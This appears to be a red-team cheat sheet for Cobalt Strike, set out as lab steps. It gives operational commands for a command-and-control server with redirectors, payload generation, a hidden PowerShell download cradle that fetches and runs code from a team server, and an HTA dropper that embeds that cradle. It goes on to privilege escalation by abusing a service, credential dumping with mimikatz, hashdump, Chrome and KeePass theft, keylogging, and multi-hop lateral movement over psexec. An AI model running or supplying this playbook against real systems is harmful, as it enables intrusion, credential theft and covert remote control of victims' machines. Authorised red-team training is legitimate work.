Cobalt Strike


Use the following install location: /opt/cobaltstrike/
     This will allow you to get third-party apps installed when running /opt/discover/update.sh

- Update
cd /opt/cobaltstrike/
./update

- Remove old data and Beacons (optional)
Stop the team server
rm -rf data/

- Start the team server
Start a screen or tmux session.

Parameters wrapped in [ ] are mandatory, those in < > are optional
./teamserver [IP] [password] <Malleable C2 profile> <kill date for Beacons yyyy-mm-dd>

./teamserver 192.168.1.5 password malleable-c2-profiles/APT/etumbot.profile 2021-12-31

When the team server starts, it will display the SHA256 hash of the SSL cert. Verify this hash when connecting.
------------------------------------------------------------------------------------------------------------------------------------------------------

# Connecting to the team server

- Locally
Right-click in the Terminal > Split Terminal Horizontally
cd /opt/cobaltstrike/
./cobaltstrike
Host: 127.0.0.1
Port: 50050
User: <your name>
Password: <password you entered from above>
Connect
Verify Fingerprint (SHA256 hash from above) > Yes

- Remote connection
OPSEC: Never expose port 50050 directly to the internet. Always use SSH and locally forward the connection.
ssh -f -N -L 50050:127.0.0.1:50050 user@teamserver
Follow the steps from above.
------------------------------------------------------------------------------------------------------------------------------------------------------

# Redirectors

OPSEC: Never allow a Beacon to make direct connections to your team server. Always use a redirector to forward the traffic.

- Create 3 free Ubuntu instances in AWS. These instances will be used for the following:
Redirector1 - HTTP
Redirector2 - HTTPS
Redirector3 - DNS

Install socat on each instance: sudo apt install socat
------------------------------------------------------------------------------------------------------------------------------------------------------

# Valid SSL certificate for Beacon 

Create a Java Keystore file. Use the fully qualified domain name of your Beacon server.
keytool -genkey -keyalg RSA -keysize 2048 -keystore domain.store

Generate a Certificate Signing Request (CSR). Submit this file to your SSL certificate vendor. 
They will verify that you are who you say are and issue a certificate.
keytool -certreq -keyalg RSA -file domain.csr -keystore domain.store

Import the Root and any Intermediate Certificates that your SSL vendor provides.
keytool -import -trustcacerts -alias FILE -file FILE.crt -keystore domain.store

Install your Domain Certificate.
keytool -import -trustcacerts -alias mykey -file domain.crt -keystore domain.store
 
Cobalt Strike expects to find the Java Keystore file in the same folder as your Malleable C2 profiles.
/opt/cobaltstrike/malleable-c2-profiles
------------------------------------------------------------------------------------------------------------------------------------------------------

# Create listeners

Cobalt Strike > Listeners > Add
Name: http
Payload: Beacon HTTP
HTTP Hosts: click + <Redirector1 IP> > OK
Save > OK

Add
Name: https
Payload: Beacon HTTPS
HTTPS Hosts: click + <Redirector2 IP>
Save > OK

Add
Name: dns
Payload: Beacon DNS
DNS Hosts: click + <Redirector3 IP>
Save > OK

Peer-to-peer listeners allow Beacons to chain their comms together over SMB or TCP.
This is needed when a target you compromised cannot reach your Team Server directly over HTTP.

Add
Name: smb
Payload: Beacon SMB
Save > OK
------------------------------------------------------------------------------------------------------------------------------------------------------

# Launch an attack to gain a foothold.

OPSEC: Staged payloads tend to have more indicators compared to stageless.
Always prefer a fully staged or stageless payload and disable payload staging.
When you see (S) in the framework, it refers to a stageless payload.

- Disable Windows Defender on your target Windows VM.
Enterprise: Windows Security > Virus & threat protection > Manage settings > turn off Real-time protection > Yes
Standard: Windows Defender settings > turn off Real-time protection

- Generate a payload
Attacks > Packages > Windows Executable (S)
Listener: select the http listener > Choose
Output: Windows EXE
Use x64 payload
Generate
Select the location for the payload > Save > OK

Transfer the payload to your target, execute, and you should receive a call back.
Click on Cobalt Strike and you will see a Beacon session appear in the top pane.

- Interact with Beacon
Right-click on the Beacon > Interact
help                                          List of available help commands
help <command>                                Get more help on a particular command
ctrl +/-                                      Increase or decrease the font size
ctrl k                                        Clear the tab

By default, Beacon will check in every 60 seconds.
sleep 0                                       Make Beacon interactive
sleep 2                                       Make Beacon call home every 2 seconds
sleep 30 10                                   Make Beacon call home every 30 seconds with a 10% jitter

Right-click on the X in the tab for additional options.
------------------------------------------------------------------------------------------------------------------------------------------------------

# HTML Application (HTA)

An HTA is a proprietary Windows program whose source code consists of HTML and one or more scripting languages supported by Internet Explorer
(VBScript and JScript). The HTML is used to generate the user interface and the scripting language for the program logic. An HTA executes without
the constraints of the browser's security model, so it executes as a "fully trusted" application.

Attacks > Web Drive-by > Scripted Web Delivery (S)
URI Path: /a
Local Host: same IP as your server
Local Port: 80
Listener: select the http listener > Choose
Type: powershell
Use x64 payload
Launch

Copy the download cradle provided > OK
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.5:80/a'))"

Open a Command Prompt on your Windows VM and run the download cradle.

Click on Cobalt Strike and you will see a Beacon session appear in the top pane.

- Example 2
Create a new file text file on a Windows VM called test.hta and paste in the following:
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an an HTA example.</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>

Make sure real-time protection is turned off.
Open a Command Promtp: rename test.hta.txt test.hta
Execute the file to see the document and calc open.
Now replace the "calc" with the download cradle from above and force mshta to use the 64-bit version of PowerShell.

shell.run "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://192.168.1.5/a'))"""
------------------------------------------------------------------------------------------------------------------------------------------------------

- Clean up
exit
Right click on the Beacon > Session > Remove
Attacks > Web Drive-by > Manage
Select each line > Kill
Listeners > Restart > OK

- Attack 3
Attacks > Packages > HTML Application
Listener: Initial access > Choose
Method: Executable
Generate
/root/evil.hta
Save > OK

Attacks > Web Drive-by > Host File
File: /root/evil.hta > Open
Local URI: /survey.txt
Local Host: 192.168.1.5
Local Port: 80
Mime Type: automatic
Launch > OK

Copy the URI provided > OK

Open Internet Explorer on your Wibndows VM to http://192.168.1.5/survey.txt
Open > Allow
Click on Cobalt Strike and you will see a Beacon session appear in the top pane.
------------------------------------------------------------------------------------------------------------------------------------------------------

View > Web Log is helpful to know when HTTP requests are hitting your team server.
Use the up arrow to scroll through previous commands.
Beacon is fully tab-completable.
All commands and their output are written to the logs directory.
ctrl+k will clear the current window.
------------------------------------------------------------------------------------------------------------------------------------------------------

# Commands

run                                               Execute a shell command via cmd.exe
powerpick                                         Execute PowerShell via Unmanaged PowerShell
psinject                                          Inject Unmanaged PowerShell into a process
powershell-inport                                 Import a PowerShell script
execute-assembly                                  Run a local .NET executable
spawn/spawnto                                     Spawn a session in rundll32
inject                                            Inject a session into a process
dllinject                                         Inject a reflective DLL into a process
shinject                                          Inject shellcode into a process
ppid                                              Change the Parent Process ID
blockdlls start                                   Ask a Beacon with a signature policy that prevents non-Microsft DLLs from loading
upload/download                                   Transfer files to and from a target
keylogger
screenshot
socks 
portscan
elevate
logonpassword                                     Use Mimikatz to dump passwords
dcsync                                            Dump hashes from a domain controller
steal_token                                       Impersonate a user from another process
make_token                                        Create a token for a user using creds
kerberos_ticket_use                               Inject Kerberos ticket
------------------------------------------------------------------------------------------------------------------------------------------------------

# Enumeration

Seatbelt
Part of https://github.com/Flangvik/SharpCollection
execute-assembly /opt/Seatbelt.exe -group=system
execute-assembly /opt/Seatbelt.exe -group=user

keylogger <PID> x64                               Inject a keystroke logger into a process
                                                  View > Keylogger > select item in lower left pane

https://github.com/HarmJ0y/Misc-PowerShell/blob/master/Start-ClipboardMonitor.ps1
psinject <PID> x64 Start-ClipboardMonitor -CollectionLimit 5

screenshot <PID> x64                              Take a screenshot
                                                  View > Screenshots > select item in lower left pane

KeeThief
https://github.com/GhostPack/KeeThief
powershell Get-KeePassDatabaseKey

Cobalt Strike > Script Manger > Load > /opt/cobaltstrike/third-party/trustedsec-bof/SA/SA.cna
help                                              New commands are added. There is no fork and run baggage.
                                                  Everything is executing in the context of Beacon.
------------------------------------------------------------------------------------------------------------------------------------------------------

# Old school enumeration

getuid                                            Get User ID
ps                                                Show process list

pwd                                               Print current directory
ls                                                List files
drives                                            List drives on target

shell tasklist
shell ver
shell ipconfig /all
shell arp -a
shell systeminfo                                  System info
shell net time                                    Show time for a host
shell netstat -ano
shell whoami
shell net start
shell qprocess

net computers                                     List hosts in a domain (groups)
net domain                                        Display domain for this host
net dclist                                        List domain controllers
net domain_controllers                            List DCs in a domain (groups)
net domain_trusts                                 List domain trusts
shell net accounts                                Policy settings for user accounts
net user                                          List users and user information
net group                                         List groups and users in groups
net localgroup                                    List local groups and users in local groups
net localgroup Users                              Show users in the Users security group
net localgroup Administrators                     Show users in the Administrators security group
net logons                                        List users logged onto a host
net sessions                                      List sessions on a host
net share                                         List shares on a host

net view                                          List hosts in a domain (browser service)

jobs                                              List long-running post-exploitation tasks. Look for keylogger JID
jobkill <JID>                                     Kill a long-running post-exploitation task. Kill the keylogger using its JID
jobs                                              Verify the keylogger is no longer running
------------------------------------------------------------------------------------------------------------------------------------------------------

# PowerShell weaponization

powershell <cmdlet> <args>                        Starts powershell.exe and uses the highest supported PowerShell version
powerpick <cmdlet> <args>                         Spawns a sacrificial process specified by spawnto and injects UnmanagedPowerShell into it
psinject <PID> <arch> <cmdlet> <args>             Injects UnmanagedPowerShell into the specified process
------------------------------------------------------------------------------------------------------------------------------------------------------

# Privilege Escalation

getsystem                                         SYSTEM account impersonation using named pipes
elevate svc-exe [listener] (creates a service that runs a payload as SYSTEM)

powershell-import /opt/PowerSploit/Privesc/PowerUp.ps1
powershell Invoke-PrivescAudit

- Example output

ServiceName   : VulnSvc
Path          : C:\Temp\vuln.exe
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'VulnSvc'
CanRestart    : Trun
Name          : VulnSvc
Check         : Modifiable Services

We can exploit this misconfiguration by replacing the executable path with our own exe that will launch a Beacon.

ls C:\Temp                                        Check to see if the exe exists.

If not, we can just upload our malicous exe to that location without having to delete a file or modify service.

Attacks > Packages > Windows Executable (S)
Stage: select your stage
Output: Windows Service EXE
x64: check box
Generate
 
cd C:\Temp                                        Change to the target directory.
upload /root/vuln.exe                             Upload malicious exe.
ls                                                Verify the exe has uploaded.
run sc start VulnSvc                              Start the service.

You should now have a new Beacon.
----------------------------------------------

SharpUp is a C# port of PowerUp
Part of https://github.com/Flangvik/SharpCollection
Not all checks are ported.
execute-assembly /opt/GhostPack/SharpUp/SharpUp.exe

elevate uac-token-duplication                     Bypass UAC, this gives you a pseudo-high integrity token
elevate svc-exe                                   Creates a SYSTEM service that will run our payload

https://github.com/rasta-mouse/Watson
Part of https://github.com/Flangvik/SharpCollection

Cobalt Strike > Script Manger > Load > /opt/cobaltstrike/elevatekit/elevate.cna
elevate or runasadmin                             New commands are added

powerpick Invoke-ServiceAbuse -Name 'crappy-service'
spawnas john Password123! smb
Select john in the top pane > right-click > Interact
bypassuac http
john should now be running in a high integrity Beacon (see asterisk)
------------------------------------------------------------------------------------------------------------------------------------------------------

# Transfer files

download <path to file>
upload <path to file>
------------------------------------------------------------------------------------------------------------------------------------------------------

# Credential Abuse

hashdump
chromedump                                        Recover Google Chrome passwords from the current user

make_token DOMAIN\user password

inject <PID> x64 >listener>

steal_token <PID>

mimikatz !lsadump::sam

SharpDump
Part of https://github.com/Flangvik/SharpCollection

execute-assembly /opt/Seatbelt.exe LSASettings
execute-assembly /opt/Seatbelt.exe CredGuard
execute-assembly /opt/Seatbelt.exe -q SecPackageCreds

execute-assembly /opt/Rubeus.exe dump
------------------------------------------------------------------------------------------------------------------------------------------------------

# Lateral movement

Always use a FQDN instead of an IP.

jump psexec                                       Run service EXE on remote host
jump psexec_psh                                   Run a PowerShell one-liner on remote host via a service
jump winrm                                        Run a PowerShell script via WinRM on remote host
remote-exec <any of the above>                    Run a single command using the above methods on remote host
------------------------------------------------------------------------------------------------------------------------------------------------------

# Process injection

inject <pid>
dllinject <pid>                                   Reflective DLL injection
dllload <pid>                                     Loading an on-disk DLL to memory
spawnto <arch> <full-exe-path>                    Process hollowing
------------------------------------------------------------------------------------------------------------------------------------------------------

upload /tmp/beacon.dll
remote-exec wmi fileserver rundll32 c:\windows\temp\beacon.dll,start
------------------------------------------------------------------------------------------------------------------------------------------------------

# Emulate lateral movement between one victim egress host and four other hosts, that uses SMB for lateral
  movement, as well as follow-on victim to victim communications.

Controller domain: acme.org
Controller IP: x.x.x.x

ifconfig eth0 add x.x.x.x
cd /opt/cobaltstrike/
rm data/*.bin
./teamserver 192.168.1.5 password /opt/cobaltstrike/third-party/profiles/APT/etumbot.profile

Start Cobalt Strike and point to localhost.

Create http and smb listeners.

Launch an attack to gain a foothold.

Login to wkstn-10 as Administrator, open a command prompt, and paste in the PowerShell.
You should have an http Beacon on Cobalt Strike in about 10 sec.

Right-click on the new http Beacon > Interact
sleep 0                                           Make the Beacon interactive
note foothold

ps                                                Look for another user logged in
inject <PID> <arch> <listener>
inject 5678 x64 smb
Right-click on the new smb Beacon > Interact
hashdump                                          Recover local account password hashes
logonpasswords                                    Harvest credentials with mimikatz
View > Credentials

net view /domain
make_token site\administrator password
net group "Domain Computers" /DOMAIN              Show computers joined to the domain
shell nltest /dclist:SITE                         Locate the domain controller
ls \\wkuser-20\C$                                 Test remote access
psexec_psh wkuser-20 smb                          You should have a new smb Beacon in about 10 sec

Right-click on the new smb Beacon > Interact
sleep 2                                           Have the Beacon check in once every 2 seconds
note 1st hop
ps
hashdump
logonpasswords
make_token site\administrator password
ls \\site-file\C$
psexec_psh site-file smb

Right-click on the new http Beacon > Interact
sleep 2
note 2nd hop
ps
hashdump
logonpasswords
make_token site\administrator password
ls \\site-dc\C$
psexec_psh site-dc smb	
	
Right-click on the new http Beacon > Interact
sleep 2
note 3rd hop
